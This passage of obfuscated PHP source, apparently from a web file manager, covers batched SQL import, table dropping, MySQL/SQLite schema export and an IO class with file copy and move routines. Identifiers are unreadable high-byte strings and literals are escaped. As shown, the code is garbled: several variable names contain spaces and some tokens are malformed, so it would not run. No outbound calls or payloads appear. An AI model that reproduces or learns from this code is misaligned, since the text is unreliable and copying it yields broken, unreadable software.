$ñ¹€ÕÑõ[352]) === 0) { if (!$­·¼Á“Ó) { $­·¼Á“Ó = $‡ÕÏ¬š . $ñ¹€ÕÑõ[53]; } continue; } if ($†öÇëÇ©) { $†öÇëÇ©->task[$ñ¹€ÕÑõ[772]] += 1; } $ ÍÌŠî++; $İ¿‘¾´Ë[] = rtrim(rtrim(trim($‡ÕÏ¬š), $ñ¹€ÕÑõ[50]), $ñ¹€ÕÑõ[71]); $ÁˆàúŞ = null; $ß„¿¤Ç = strlen($‡ÕÏ¬š); $÷¼È·†û += $ß„¿¤Ç; if ($÷¼È·†û >= ($Ÿ˜ŞØ‡µ == 500 ? $Ñ‚»—íº : $ã‹ÙĞ—ª)) { $ÁˆàúŞ = array_pop($İ¿‘¾´Ë); if ($ ÍÌŠî > 1) { $ ÍÌŠî--; } } if ($ ÍÌŠî >= $Ÿ˜ŞØ‡µ || $ÁˆàúŞ) { $‡ÕÏ¬š = $­·¼Á“Ó . implode($ñ¹€ÕÑõ[50], $İ¿‘¾´Ë); if (!$šª………->execute($‡ÕÏ¬š)) { return !1; } if ($†öÇëÇ©) { $†öÇëÇ©->update($ ÍÌŠî); } $İ¿‘¾´Ë = array(); $ ÍÌŠî = 0; $÷¼È·†û = 0; if ($ÁˆàúŞ) { $İ¿‘¾´Ë = array($ÁˆàúŞ); $ ÍÌŠî = 1; $÷¼È·†û = $ß„¿¤Ç; } } } fclose($›¥»ã——); if (!empty($İ¿‘¾´Ë)) { $‡ÕÏ¬š = $­·¼Á“Ó . implode($ñ¹€ÕÑõ[50], $İ¿‘¾´Ë); if (!$šª………->execute($‡ÕÏ¬š)) { return !1; } if ($†öÇëÇ©) { $†öÇëÇ©->update($ ÍÌŠî); } } return !0; } public function dropTable($Û–İŞº = null) { $”‘‘ˆÖæ = $this->model()->db(); $äŸÒ˜˜´ = $Û–İŞº ? array($Û–İŞº) : $”‘‘ˆÖæ->getTables(); if (!$äŸÒ˜˜´) { return; } foreach ($äŸÒ˜˜´ as $Û–İŞº) { if ($Û–İŞº) { $Û–İŞº = strtolower($Û–İŞº); } else { continue; } $”‘‘ˆÖæ->execute("\x64\x72\157\x70\x20\164\x61\142\154\145\x20\x69\x66\40\x65\170\x69\x73\164\x73\x20\x60{$Û–İŞº}\x60"); } } private function sqlEncode($ïŒ„ß‚ñ) { $“ıóÏÓê =& $_SERVER[ê‘³Æ±]; $ÏŞÈ’–… = array(); foreach ($ïŒ„ß‚ñ as $¾Õ°–—´) { if (is_array($¾Õ°–—´)) { $¾Õ°–—´ = json_encode_force($¾Õ°–—´); } $¾Õ°–—´ = addslashes($¾Õ°–—´); $¾Õ°–—´ = str_replace(array($“ıóÏÓê[1067], $“ıóÏÓê[228]), array($“ıóÏÓê[1068], $“ıóÏÓê[1069]), $¾Õ°–—´); $ÏŞÈ’–…[] = str_replace($“ıóÏÓê[58], $“ıóÏÓê[1070], $¾Õ°–—´); } return $“ıóÏÓê[58] . implode($“ıóÏÓê[1071], $ÏŞÈ’–…) . $“ıóÏÓê[58]; } private function sqlDecode($©®ã—û÷, $¯€İş¡, $„÷°€Ä† = '') { $“›ä˜÷ =& $_SERVER[ê‘³Æ±]; $©®ã—û÷ = str_replace(array($“›ä˜÷[1068], $“›ä˜÷[1069]), array($“›ä˜÷[1067], $“›ä˜÷[228]), $©®ã—û÷); if ($¯€İş¡ == $“›ä˜÷[13]) { return $„÷°€Ä† != $“›ä˜÷[1072] ? stripslashes($©®ã—û÷) : $©®ã—û÷; } if ($„÷°€Ä† == $“›ä˜÷[1072]) { $©®ã—û÷ = str_replace($“›ä˜÷[1073], $“›ä˜÷[119], stripslashes($©®ã—û÷)); } return $©®ã—û÷; } public function getSqlFile($Á„óó›ı = '') { $ï’ÍŠ—Ö =& $_SERVER[ê‘³Æ±]; $ó½¾Şâ÷ = $this->dbType(!0); $Ã•„Áí = CONTROLLER_DIR . "\151\x6e\163\x74\141\x6c\x6c\x2f\144\x61\164\x61\x2f{$ó½¾Şâ÷}\x2e\163\x71\154"; $¡ˆÓÇÍŞ = file_get_contents($Ã•„Áí); $‹°úƒ’Ş = $ï’ÍŠ—Ö[1074] . ($ó½¾Şâ÷ == $ï’ÍŠ—Ö[798] ? $ï’ÍŠ—Ö[1075] : $ï’ÍŠ—Ö[1076]) . $ï’ÍŠ—Ö[1077]; preg_match_all($‹°úƒ’Ş, $¡ˆÓÇÍŞ, $¯Ê¦Ø²); $çÊÊ·©ˆ = $¯Ê¦Ø²[1]; $î×ÓÔë = $this->model()->db(); $İıÌÉõ = $î×ÓÔë->getTables(); $È¡ÈöÈè = TEMP_FILES . $ï’ÍŠ—Ö[1078] . date($ï’ÍŠ—Ö[737]) . $ï’ÍŠ—Ö[8]; del_dir($È¡ÈöÈè); mk_dir($È¡ÈöÈè); $¿¬Éóäé = $È¡ÈöÈè . $ï’ÍŠ—Ö[1079]; $´øÏíù = $È¡ÈöÈè . $ï’ÍŠ—Ö[1080]; $ê´ªú­ = $ó½¾Şâ÷ == $ï’ÍŠ—Ö[13] ? $ï’ÍŠ—Ö[798] : $ï’ÍŠ—Ö[13]; IO::copy(CONTROLLER_DIR . "\151\x6e\x73\x74\x61\x6c\x6c\x2f\x64\141\164\141\57{$ê´ªú­}\56\163\161\x6c", $È¡ÈöÈè); @touch($È¡ÈöÈè . $ó½¾Şâ÷ . $ï’ÍŠ—Ö[774]); $ÔóåÂ¸ä = fopen($¿¬Éóäé, $ï’ÍŠ—Ö[1055]); $Ş«¼üÓ = fopen($´øÏíù, $ï’ÍŠ—Ö[1055]); if ($ó½¾Şâ÷ == $ï’ÍŠ—Ö[13]) { $İıÌÉõ = array_diff($İıÌÉõ, array($ï’ÍŠ—Ö[770], $ï’ÍŠ—Ö[771])); $ŸïºÃ™ó = array($ï’ÍŠ—Ö[1081], $ï’ÍŠ—Ö[1082], $ï’ÍŠ—Ö[1083]); fwrite($Ş«¼üÓ, implode(PHP_EOL, $ŸïºÃ™ó) . PHP_EOL . PHP_EOL); foreach ($İıÌÉõ as $ÆÎÔË­) { $ËôÖ™ğÍ = $this->sqlFromSqlite($ÆÎÔË­); if (!$ËôÖ™ğÍ[$ï’ÍŠ—Ö[13]]) { continue; } fwrite($Ş«¼üÓ, $ËôÖ™ğÍ[$ï’ÍŠ—Ö[13]] . PHP_EOL . PHP_EOL); if (!in_array($ÆÎÔË­, $çÊÊ·©ˆ)) { fwrite($ÔóåÂ¸ä, $ËôÖ™ğÍ[$ï’ÍŠ—Ö[798]] . PHP_EOL . PHP_EOL); } } } else { foreach ($İıÌÉõ as $ÆÎÔË­) { $ËôÖ™ğÍ = $this->sqlFromMysql($ÆÎÔË­); if (!$ËôÖ™ğÍ[$ï’ÍŠ—Ö[798]]) { continue; } fwrite($ÔóåÂ¸ä, $ËôÖ™ğÍ[$ï’ÍŠ—Ö[798]] . PHP_EOL . PHP_EOL); if (!in_array($ÆÎÔË­, $çÊÊ·©ˆ)) { fwrite($Ş«¼üÓ, $ËôÖ™ğÍ[$ï’ÍŠ—Ö[13]] . PHP_EOL . PHP_EOL); } } } fclose($ÔóåÂ¸ä); fclose($Ş«¼üÓ); $¡ˆÓÇÍŞ = array($ï’ÍŠ—Ö[798] => $¿¬Éóäé, $ï’ÍŠ—Ö[13] => $´øÏíù); return $Á„óó›ı ? $¡ˆÓÇÍŞ[$Á„óó›ı] : $¡ˆÓÇÍŞ; } public function dbType($ÇöêŒ = false) { $­‹Êùƒ =& $_SERVER[ê‘³Æ±]; $ºÎ¦€ ³ = $ÇöêŒ ? $GLOBALS[$­‹Êùƒ[6]][$­‹Êùƒ[21]] : $this->database; $ºÎ¦€ ³ = array_change_key_case($ºÎ¦€ ³); $²Ÿğ—¯ = $ºÎ¦€ ³[$­‹Êùƒ[956]]; if ($²Ÿğ—¯ == $­‹Êùƒ[953]) { $á«ş¼Äé = explode($­‹Êùƒ[4], $ºÎ¦€ ³[$­‹Êùƒ[962]]); $²Ÿğ—¯ = $á«ş¼Äé[0]; } $òø· ãÖ = array($­‹Êùƒ[1084] => $­‹Êùƒ[13], $­‹Êùƒ[901] => $­‹Êùƒ[798]); if (isset($òø· ãÖ[$²Ÿğ—¯])) { $²Ÿğ—¯ = $òø· ãÖ[$²Ÿğ—¯]; } return $²Ÿğ—¯; } public function sqlFromMysql($àßËœŸ², $¥­¢Ä¦ä = '') { $ãş²ıØØ =& $_SERVER[ê‘³Æ±]; $¾Œ¬À‹± = $this->model()->db(); $ğáúŸÊ = $¾Œ¬À‹±->query($ãş²ıØØ[1085] . $àßËœŸ² . $ãş²ıØØ[382]); if (!$ğáúŸÊ || !$ğáúŸÊ[0]) { return !1; } $¡±‚â© = _get($ğáúŸÊ[0], $ãş²ıØØ[1086], $ãş²ıØØ[12]); if (!$¡±‚â©) { return !1; } $¹“¥‹¿ = "\x44\x52\x4f\120\x20\x54\x41\102\114\x45\40\111\106\x20\105\130\111\x53\124\x53\x20\x60{$àßËœŸ²}\x60\x3b" . PHP_EOL . $¡±‚â© . $ãş²ıØØ[71]; if ($¥­¢Ä¦ä && $¥­¢Ä¦ä == $ãş²ıØØ[798]) { return $¹“¥‹¿; } $œşõÃ¬€ = array_change_key_case($GLOBALS[$ãş²ıØØ[6]][$ãş²ıØØ[21]]); $ìœÎİ°û = $œşõÃ¬€[$ãş²ıØØ[961]]; $è¶—ø× = $ãş²ıØØ[1087] . $ìœÎİ°û . $ãş²ıØØ[1088] . $àßËœŸ² . $ãş²ıØØ[58]; $ÏÑ³ÎÁ½ = $ãş²ıØØ[1089] . $àßËœŸ² . $ãş²ıØØ[889]; $ë®Ü½ÌØ = $¾Œ¬À‹±->query($è¶—ø×); if (empty($ë®Ü½ÌØ)) { $¸ƒ…³° = array($ãş²ıØØ[798] => $ãş²ıØØ[12], $ãş²ıØØ[13] => $ãş²ıØØ[12]); return $¥­¢Ä¦ä ? $¸ƒ…³°[$¥­¢Ä¦ä] : $¸ƒ…³°; } $ÜŸíø‹é = $¾Œ¬À‹±->query($ÏÑ³ÎÁ½); $˜ÀÔØ¢ = $ãş²ıØØ[12]; $¼°íÕŒˆ = array(); foreach ($ÜŸíø‹é as $¹ıØÛÅ‘) { if (!$˜ÀÔØ¢ && $¹ıØÛÅ‘[$ãş²ıØØ[1090]] == $ãş²ıØØ[1091]) { $˜ÀÔØ¢ = $¹ıØÛÅ‘[$ãş²ıØØ[1092]]; } if (isset($¼°íÕŒˆ[$¹ıØÛÅ‘[$ãş²ıØØ[1090]]])) { $¼°íÕŒˆ[$¹ıØÛÅ‘[$ãş²ıØØ[1090]]][$ãş²ıØØ[1093]][] = $¹ıØÛÅ‘[$ãş²ıØØ[1092]]; continue; } $¼°íÕŒˆ[$¹ıØÛÅ‘[$ãş²ıØØ[1090]]] = array($ãş²ıØØ[1094] => $¹ıØÛÅ‘[$ãş²ıØØ[1090]], $ãş²ıØØ[1093] => array($¹ıØÛÅ‘[$ãş²ıØØ[1092]]), $ãş²ıØØ[1095] => $¹ıØÛÅ‘[$ãş²ıØØ[1096]] == $ãş²ıØØ[89] ? 0 : 1); } $Ç±Äü®¾ = array(); foreach ($¼°íÕŒˆ as $¹ıØÛÅ‘) { $ş“ÄËÇ¸ = $¹ıØÛÅ‘[$ãş²ıØØ[1094]] == $ãş²ıØØ[1091]; $ø™û»Æû = array($ãş²ıØØ[1097], $¹ıØÛÅ‘[$ãş²ıØØ[1095]] == $ãş²ıØØ[89] && !$ş“ÄËÇ¸ ? $ãş²ıØØ[1098] : $ãş²ıØØ[12], $ãş²ıØØ[1099], $ãş²ıØØ[1100] . $àßËœŸ² . $ãş²ıØØ[11] . ($ş“ÄËÇ¸ ? $ãş²ıØØ[1101] : $¹ıØÛÅ‘[$ãş²ıØØ[1094]]) . $ãş²ıØØ[119], $ãş²ıØØ[1102], $ãş²ıØØ[119] . $àßËœŸ² . $ãş²ıØØ[119], $ãş²ıØØ[1103] . implode($ãş²ıØØ[1104], $¹ıØÛÅ‘[$ãş²ıØØ[1093]]) . $ãş²ıØØ[1105]); $Ç±Äü®¾[] = implode($ãş²ıØØ[53], $ø™û»Æû) . $ãş²ıØØ[71]; } $Ò”ª‹« = array(); $ª™ÊÕŒâ = array($ãş²ıØØ[1106] => $ãş²ıØØ[1107], $ãş²ıØØ[1107] => $ãş²ıØØ[1107], $ãş²ıØØ[285] => $ãş²ıØØ[312], $ãş²ıØØ[284] => $ãş²ıØØ[312]); foreach ($ë®Ü½ÌØ as $¹ıØÛÅ‘) { $ø™û»Æû = array($ãş²ıØØ[119] . $¹ıØÛÅ‘[$ãş²ıØØ[1108]] . $ãş²ıØØ[119], isset($ª™ÊÕŒâ[$¹ıØÛÅ‘[$ãş²ıØØ[1109]]]) ? $ª™ÊÕŒâ[$¹ıØÛÅ‘[$ãş²ıØØ[1109]]] : $¹ıØÛÅ‘[$ãş²ıØØ[1110]], $¹ıØÛÅ‘[$ãş²ıØØ[1111]] == $ãş²ıØØ[887] ? $ãş²ıØØ[1112] : $ãş²ıØØ[1113], $¹ıØÛÅ‘[$ãş²ıØØ[1108]] == $˜ÀÔØ¢ ? $ãş²ıØØ[1114] : $ãş²ıØØ[12], $¹ıØÛÅ‘[$ãş²ıØØ[938]] ? strtoupper(str_replace($ãş²ıØØ[11], $ãş²ıØØ[12], $¹ıØÛÅ‘[$ãş²ıØØ[938]])) : $ãş²ıØØ[12]); $Ò”ª‹«[] = trim(implode($ãş²ıØØ[53], $ø™û»Æû)); } $ô´Ô°á¤ = array($ãş²ıØØ[1115] . $àßËœŸ² . $ãş²ıØØ[1116], $ãş²ıØØ[1117] . $àßËœŸ² . $ãş²ıØØ[1118], implode($ãş²ıØØ[50] . PHP_EOL, $Ò”ª‹«), $ãş²ıØØ[935]); $¡¸¸é¥’ = implode(PHP_EOL, array_merge($ô´Ô°á¤, $Ç±Äü®¾)); if ($¥­¢Ä¦ä && $¥­¢Ä¦ä == $ãş²ıØØ[13]) { return $¡¸¸é¥’; } $¸ƒ…³° = array($ãş²ıØØ[798] => $¹“¥‹¿, $ãş²ıØØ[13] => $¡¸¸é¥’); return $¥­¢Ä¦ä ? $¸ƒ…³°[$¥­¢Ä¦ä] : $¸ƒ…³°; } public function sqlFromSqlite($†Š–×ı, $Ü¡µ›Ÿ = '') { $ìÒ˜ÙÙ =& $_SERVER[ê‘³Æ±]; $´ÊşŞÛ = $this->model()->db(); $®Ÿ·Í‹Ä = "\120\122\x41\x47\115\101\40\x54\x41\x42\114\x45\x5f\x49\116\106\x4f\x20\50\47{$†Š–×ı}\47\51"; $‹Ì’Œˆ± = "\123\105\x4c\x45\x43\124\x20\x2a\x20\x46\122\117\x4d\x20\163\x71\x6c\151\x74\145\x5f\x6d\x61\163\164\x65\x72\x20\127\110\x45\122\x45\40\164\x62\154\x5f\156\141\x6d\145\40\75\40\x27{$†Š–×ı}\47"; $½çùÜæ£ = $´ÊşŞÛ->query($®Ÿ·Í‹Ä); if (empty($½çùÜæ£)) { $ ÏöØ‚† = array($ìÒ˜ÙÙ[798] => $ìÒ˜ÙÙ[12], $ìÒ˜ÙÙ[13] => $ìÒ˜ÙÙ[12]); return $Ü¡µ›Ÿ ? $ ÏöØ‚†[$Ü¡µ›Ÿ] : $ ÏöØ‚†; } $Çíá«› = $´ÊşŞÛ->query($‹Ì’Œˆ±); $—ğ‘Ê = $¢îÖĞ¶ = array(); foreach ($Çíá«› as $ÙÁı§Š²) { if ($ÙÁı§Š²[$ìÒ˜ÙÙ[33]] == $ìÒ˜ÙÙ[276]) { $—ğ‘Ê[] = $ÙÁı§Š²[$ìÒ˜ÙÙ[1119]]; } else { $¢îÖĞ¶[$ÙÁı§Š²[$ìÒ˜ÙÙ[32]]] = $ÙÁı§Š²[$ìÒ˜ÙÙ[1119]]; } } $şÂğè³· = array_merge(array($ìÒ˜ÙÙ[1115] . $†Š–×ı . $ìÒ˜ÙÙ[119]), $—ğ‘Ê, array_values($¢îÖĞ¶)); $şÂğè³· = implode($ìÒ˜ÙÙ[71] . PHP_EOL, $şÂğè³·) . $ìÒ˜ÙÙ[71]; if ($Ü¡µ›Ÿ && $Ü¡µ›Ÿ == $ìÒ˜ÙÙ[13]) { return $şÂğè³·; } $¹¤ËÉ¥ú = array(); $ñøŒŠÇ“ = array($ìÒ˜ÙÙ[1107] => $ìÒ˜ÙÙ[1120], $ìÒ˜ÙÙ[312] => $ìÒ˜ÙÙ[1121]); $Ş­“üûã = $ìÒ˜ÙÙ[12]; foreach ($½çùÜæ£ as $ÙÁı§Š²) { if ($ÙÁı§Š²[$ìÒ˜ÙÙ[57]] == $ìÒ˜ÙÙ[89]) { $Ş­“üûã = $ÙÁı§Š²[$ìÒ˜ÙÙ[32]]; } $ïÀ‹Şõ = array($ìÒ˜ÙÙ[382] . $ÙÁı§Š²[$ìÒ˜ÙÙ[32]] . $ìÒ˜ÙÙ[382], isset($ñøŒŠÇ“[$ÙÁı§Š²[$ìÒ˜ÙÙ[33]]]) ? $ñøŒŠÇ“[$ÙÁı§Š²[$ìÒ˜ÙÙ[33]]] : $ÙÁı§Š²[$ìÒ˜ÙÙ[33]], $ÙÁı§Š²[$ìÒ˜ÙÙ[35]] == $ìÒ˜ÙÙ[89] ? $ìÒ˜ÙÙ[1112] : $ìÒ˜ÙÙ[1122] . $ÙÁı§Š²[$ìÒ˜ÙÙ[56]], $ÙÁı§Š²[$ìÒ˜ÙÙ[57]] == $ìÒ˜ÙÙ[89] ? $ìÒ˜ÙÙ[1123] : $ìÒ˜ÙÙ[12]); $¹¤ËÉ¥ú[] = trim(implode($ìÒ˜ÙÙ[53], $ïÀ‹Şõ)); } foreach ($¢îÖĞ¶ as $Š×›Šíğ => $Àºµ¸‹ê) { $İâèèóŠ = str_replace($ìÒ˜ÙÙ[1124] . $†Š–×ı . $ìÒ˜ÙÙ[11], $ìÒ˜ÙÙ[12], $Š×›Šíğ); $ïÀÔÏ‚› = str_replace(array($ìÒ˜ÙÙ[119], $ìÒ˜ÙÙ[946]), $ìÒ˜ÙÙ[382], substr($Àºµ¸‹ê, stripos($Àºµ¸‹ê, $ìÒ˜ÙÙ[257]))); if ($İâèèóŠ == $ìÒ˜ÙÙ[1101]) { $É“¸¬šÌ = $ìÒ˜ÙÙ[1125] . $Ş­“üûã . $ìÒ˜ÙÙ[1126]; } else { $É“¸¬šÌ = (stripos($İâèèóŠ, $ìÒ˜ÙÙ[11]) ? $ìÒ˜ÙÙ[1127] : $ìÒ˜ÙÙ[12]) . ($ìÒ˜ÙÙ[1128] . $İâèèóŠ . $ìÒ˜ÙÙ[1129] . $ïÀÔÏ‚›); } $¹¤ËÉ¥ú[] = $É“¸¬šÌ; } $ı³¡êÔÙ = array($ìÒ˜ÙÙ[1130] . $†Š–×ı . $ìÒ˜ÙÙ[1131], $ìÒ˜ÙÙ[1132] . $†Š–×ı . $ìÒ˜ÙÙ[1133], implode($ìÒ˜ÙÙ[50] . PHP_EOL, $¹¤ËÉ¥ú), $ìÒ˜ÙÙ[1134]); $æ„Ğ¯±§ = implode(PHP_EOL, $ı³¡êÔÙ); if ($Ü¡µ›Ÿ && $Ü¡µ›Ÿ == $ìÒ˜ÙÙ[798]) { return $æ„Ğ¯±§; } $ ÏöØ‚† = array($ìÒ˜ÙÙ[798] => $æ„Ğ¯±§, $ìÒ˜ÙÙ[13] => $şÂğè³·); return $Ü¡µ›Ÿ ? $ ÏöØ‚†[$Ü¡µ›Ÿ] : $ ÏöØ‚†; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ˆ»ûê¤¬, $ âô³‰¥) { $³“½Ç”ğ =& $_SERVER[ê‘³Æ±]; $¿šŠÈ†Ü = $ âô³‰¥; $GLOBALS[$³“½Ç”ğ[1135]] = $³“½Ç”ğ[1136] . $ˆ»ûê¤¬; Hook::trigger($³“½Ç”ğ[1136] . $ˆ»ûê¤¬ . $³“½Ç”ğ[1137], $¿šŠÈ†Ü); $åªõ‹¬¤ = self::driverMake($ âô³‰¥[0]); if (!$åªõ‹¬¤) { return !1; } if (method_exists($åªõ‹¬¤, $ˆ»ûê¤¬)) { $ÛŸâäÇ† = @call_user_func_array(array($åªõ‹¬¤, $ˆ»ûê¤¬), $ âô³‰¥); } else { if (method_exists($åªõ‹¬¤, $³“½Ç”ğ[1138])) { $ÛŸâäÇ† = @call_user_func_array(array($åªõ‹¬¤, $ˆ»ûê¤¬), $ âô³‰¥); } else { if (method_exists(self, $ˆ»ûê¤¬)) { $ÛŸâäÇ† = @call_user_func_array(array(self, $ˆ»ûê¤¬), $ âô³‰¥); } else { $ÛŸâäÇ† = call_user_func_array(array(parent, $ˆ»ûê¤¬), $ âô³‰¥); } } } Hook::trigger($³“½Ç”ğ[1136] . $ˆ»ûê¤¬ . $³“½Ç”ğ[1139], $¿šŠÈ†Ü, $ÛŸâäÇ†); return $ÛŸâäÇ†; } public static function init($®ÜÔúËİ) { return self::driverMake($®ÜÔúËİ); } public static function copy($Ø­›äÄ±, $×íƒ—ú, $ä¾‘åÒæ = false, $ÊÀ±ƒ¢¼ = false) { return self::copyMoveStart($Ø­›äÄ±, $×íƒ—ú, $ä¾‘åÒæ, $_SERVER[ê‘³Æ±][545], $ÊÀ±ƒ¢¼); } public static function move($Âµ²º›, $­Š˜èºÉ, $‰Ù‰‘» = false, $˜Ìâ—ˆ’ = false) { return self::copyMoveStart($Âµ²º›, $­Š˜èºÉ, $‰Ù‰‘», $_SERVER[ê‘³Æ±][547], $˜Ìâ—ˆ’); } private static function copyMoveStart($…õ²ÈáĞ, $€­ç¿Æ•, $ñ¿•Ñ£¾, $ù‹§ØöÖ, $·—„Ù†) { $ı³ôÛÁ =& $_SERVER[ê‘³Æ±]; $…ó™ìû„ = array($…õ²ÈáĞ, $€­ç¿Æ•, $ñ¿•Ñ£¾, $·—„Ù†); Hook::trigger($ı³ôÛÁ[1136] . $ù‹§ØöÖ . $ı³ôÛÁ[1137], $…ó™ìû„); $ëìÊáù† = self::copyMove($…õ²ÈáĞ, $€­ç¿Æ•, $ñ¿•Ñ£¾, $ù‹§ØöÖ, $·—„Ù†); Hook::trigger($ı³ôÛÁ[1136] . $ù‹§ØöÖ . $ı³ôÛÁ[1139], $…ó™ìû„, $ëìÊáù†); return $ëìÊáù†; } public static function saveFile($…Šú, $¡ğõ¨Ã, $ÌÛî´Ñ÷ = true) { $Û·§„ñÃ =& $_SERVER[ê‘³Æ±]; $‚¬Ïí‚ = self::info($¡ğõ¨Ã); $øÎÎİ = self::driverMake($…Šú); $¾–¹æş³ = self::driverMake($¡ğõ¨Ã); $ª™ÓõÊ‡ = !1; if ($¾–¹æş³->pathParse[$Û·§„ñÃ[1140]]) { $ª™ÓõÊ‡ = $¾–¹æş³; $˜ªÚ°Ì = $¾–¹æş³->pathParse[$Û·§„ñÃ[1140]]; $¾–¹æş³ = self::driverMake($˜ªÚ°Ì); } if ($øÎÎİ->pathParse[$Û·§„ñÃ[1140]]) { $ÁÎ¹‹ºò = $øÎÎİ->pathParse[$Û·§„ñÃ[1140]]; $øÎÎİ = self::driverMake($ÁÎ¹‹ºò); } $¹í¦½²ñ = $¾–¹æş³->pathFather($¡ğõ¨Ã); $´Æá‘ó = !0; if (!$ÌÛî´Ñ÷ && self::driverIsSame($øÎÎİ, $¾–¹æş³)) { $´Æá‘ó = !1; } $§›ÈŒÂÔ = self::copyFile($øÎÎİ, $…Šú, $¾–¹æş³, $¹í¦½²ñ, $‚¬Ïí‚[$Û·§„ñÃ[32]], $´Æá‘ó); if ($ª™ÓõÊ‡) { $§›ÈŒÂÔ = $ª™ÓõÊ‡->getPathOuter($§›ÈŒÂÔ); } return $§›ÈŒÂÔ; } private static function copyMove($¤Çç±, $¿šËëÔ½, $ïëô ñ, $ˆãúíçÄ, $§Êç¹«ª = false) { $“íùà¢ =& $_SERVER[ê‘³Æ±]; if (!$¤Çç± || $¤Çç± == $“íùà¢[8] || !$¿šËëÔ½) { return !1; } ignore_timeout(); $åØ åŒÊ = self::driverMake($¤Çç±); $¸õ¬ë–ï = self::driverMake($¿šËëÔ½); $¼€Ò‰æØ = $ˆãúíçÄ == $“íùà¢[547]; $íÍÚá°ô = !1; if ($¸õ¬ë–ï->pathParse[$“íùà¢[1140]]) { $íÍÚá°ô = $¸õ¬ë–ï; $¿šËëÔ½ = $¸õ¬ë–ï->pathParse[$“íùà¢[1140]]; $¸õ¬ë–ï = self::driverMake($¿šËëÔ½); } if ($åØ åŒÊ->pathParse[$“íùà¢[1140]]) { $¤Çç± = $åØ åŒÊ->pathParse[$“íùà¢[1140]]; $åØ åŒÊ = self::driverMake($¤Çç±); } self::check($åØ åŒÊ, $¤Çç±, $¸õ¬ë–ï, $¿šËëÔ½); Hook::trigger($“íùà¢[75], $åØ åŒÊ, $¤Çç±, $¸õ¬ë–ï, $¿šËëÔ½); $†€¢–ø¦ = self::driverIsSame($åØ åŒÊ, $¸õ¬ë–ï); if ($†€¢–ø¦) { if ($ˆãúíçÄ == $“íùà¢[547] && !method_exists($¸õ¬ë–ï, $“íùà¢[1141]) && trim($¿šËëÔ½, $“íùà¢[8]) == trim($¸õ¬ë–ï->pathFather($¤Çç±), $“íùà¢[8])) { if ($åØ åŒÊ->pathThis($¤Çç±) != $§Êç¹«ª && !$åØ åŒÊ->isTypeObject()) { return $åØ åŒÊ->rename($¤Çç±, $§Êç¹«ª); } return $¸õ¬ë–ï->getPathOuter($¤Çç±); } if (method_exists($¸õ¬ë–ï, $ˆãúíçÄ)) { return $¸õ¬ë–ï->{$ˆãúíçÄ}($¤Çç±, $¿šËëÔ½, $ïëô ñ, $§Êç¹«ª); } } if ($†€¢–ø¦ && $ˆãúíçÄ == $“íùà¢[547] && $¸õ¬ë–ï->getType() == $“íùà¢[107]) { $şÇ®µ×¦ = $¸õ¬ë–ï->movePath($¤Çç±, $¿šËëÔ½, $§Êç¹«ª); if ($şÇ®µ×¦) { return $şÇ®µ×¦; } } $Á««Ô = $åØ åŒÊ->isFile($¤Çç±); if (!$Á««Ô && $¸õ¬ë–ï->getType() == $“íùà¢[744] && $åØ åŒÊ->getType() == $“íùà¢[107]) { $şÇ®µ×¦ = $¸õ¬ë–ï->copyFolderFromIO($åØ åŒÊ, $¤Çç±, $¿šËëÔ½, $ïëô ñ, $¼€Ò‰æØ, $§Êç¹«ª); } else { $şÇ®µ×¦ = self::copyPath($åØ åŒÊ, $¤Çç±, $¸õ¬ë–ï, $¿šËëÔ½, $ïëô ñ, $¼€Ò‰æØ, $Á««Ô, $§Êç¹«ª); } if ($şÇ®µ×¦ && $¼€Ò‰æØ) { $åØ åŒÊ->remove($¤Çç±); } if ($íÍÚá°ô) { $şÇ®µ×¦ = $íÍÚá°ô->getPathOuter($şÇ®µ×¦); } return $şÇ®µ×¦; } private static function check($õëĞı‘·, $âùÊÓë, $¾×Ë²Œ‹, &$üì”Ã¼ê) { $–ãä¡‹ =& $_SERVER[ê‘³Æ±]; if (self::driverIsSame($õëĞı‘·, $¾×Ë²Œ‹) && $õëĞı‘·->isFolder($âùÊÓë) && $õëĞı‘·->isParentOf($âùÊÓë, $üì”Ã¼ê)) { show_json(LNG($–ãä¡‹[1142]), !1); } if (!$õëĞı‘·->exist($âùÊÓë)) { show_json(LNG($–ãä¡‹[106]), !1); } } private static function copyPath($ÎÓ¾ğÆÎ, $™ìİäÉ, $µ¼öû®Ğ, $ïÆ‹¼¡, $ÆÜıšëª, $¾š¶Ç, $Âíùüª©, $ìå¡ƒ = false) { $ÄØÌ³Ùİ =& $_SERVER[ê‘³Æ±]; $‹ö­ù”— = empty($ìå¡ƒ) && $ìå¡ƒ !== $ÄØÌ³Ùİ[192] ? $ÎÓ¾ğÆÎ->pathThis($™ìİäÉ) : $ìå¡ƒ; if ($ÆÜıšëª) { $ÛÆ§¸ñ = $µ¼öû®Ğ->fileNameExist($ïÆ‹¼¡, $‹ö­ù”—); $‹ö­ù”— = $µ¼öû®Ğ->fileNameAuto($ïÆ‹¼¡, $‹ö­ù”—, $ÆÜıšëª, !$Âíùüª©); $ÆÜıšëª = $ÛÆ§¸ñ ? $ÆÜıšëª : !1; } if ($Âíùüª©) { return self::copyFile($ÎÓ¾ğÆÎ, $™ìİäÉ, $µ¼öû®Ğ, $ïÆ‹¼¡, $‹ö­ù”—, $¾š¶Ç); } if ($ÆÜıšëª == REPEAT_RENAME_FOLDER) { $ÆÜıšëª = !1; } $éë±ÂÕ÷ = rtrim($ïÆ‹¼¡, $ÄØÌ³Ùİ[8]) . $ÄØÌ³Ùİ[8] . $‹ö­ù”—; $ı©èşÓ€ = $µ¼öû®Ğ->mkdir($µ¼öû®Ğ->getPath($éë±ÂÕ÷)); $ïÆ‹¼¡ = $µ¼öû®Ğ->getPathInner($ı©èşÓ€); $Ì×»ÏÁ£ = $ÎÓ¾ğÆÎ->listPath($™ìİäÉ, !0); $Ì×»ÏÁ£ = is_array($Ì×»ÏÁ£) ? $Ì×»ÏÁ£ : array($ÄØÌ³Ùİ[76] => array(), $ÄØÌ³Ùİ[77] => array()); $ŸÄÖå´ = array_merge($Ì×»ÏÁ£[$ÄØÌ³Ùİ[76]], $Ì×»ÏÁ£[$ÄØÌ³Ùİ[77]]); foreach ($ŸÄÖå´ as $„Éì™ è) { $àí˜±İÓ = $„Éì™ è[$ÄØÌ³Ùİ[33]] == $ÄØÌ³Ùİ[194]; $™ìİäÉ = $ÎÓ¾ğÆÎ->getPathInner($„Éì™ è[$ÄØÌ³Ùİ[78]]); $•™¡È˜ = self::copyPath($ÎÓ¾ğÆÎ, $™ìİäÉ, $µ¼öû®Ğ, $ïÆ‹¼¡, $ÆÜıšëª, $¾š¶Ç, $àí˜±İÓ); if 